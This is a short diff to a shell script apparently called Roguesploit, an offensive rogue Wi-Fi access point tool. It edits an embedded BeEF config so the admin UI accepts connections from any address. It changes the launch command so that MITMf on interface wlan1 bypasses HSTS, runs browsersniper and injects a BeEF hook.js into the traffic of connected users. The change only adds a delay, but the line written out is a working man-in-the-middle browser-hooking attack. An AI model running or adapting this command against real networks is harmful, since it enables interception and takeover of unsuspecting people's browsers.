@@ -162,7 +162,6 @@ beef:
         # subnet of IP addresses that can connect to the admin UI
         #permitted_ui_subnet: "127.0.0.1/32"
         permitted_ui_subnet: "0.0.0.0/0"
-	permitted_ui_subnet: "10.0.0.1/32"
 
     # HTTP server
     http:
@@ -903,7 +902,7 @@ beef:
 EOF
 	sleep 0.6
 	echo -e $blue"["$red"!"$blue"]"$white" Starting Roguesploit Pwning! "$blue"["$red"!"$blue"]"
-	rogueon & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e ./BeEFStarter & xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "mitmf -i wlan1 --hsts --browsersniper --inject --js-url http://10.0.0.1:3000/hook.js"
+	rogueon & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e ./BeEFStarter & sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "mitmf -i wlan1 --hsts --browsersniper --inject --js-url http://10.0.0.1:3000/hook.js"
 	menu
 }
 #Welcome Screen
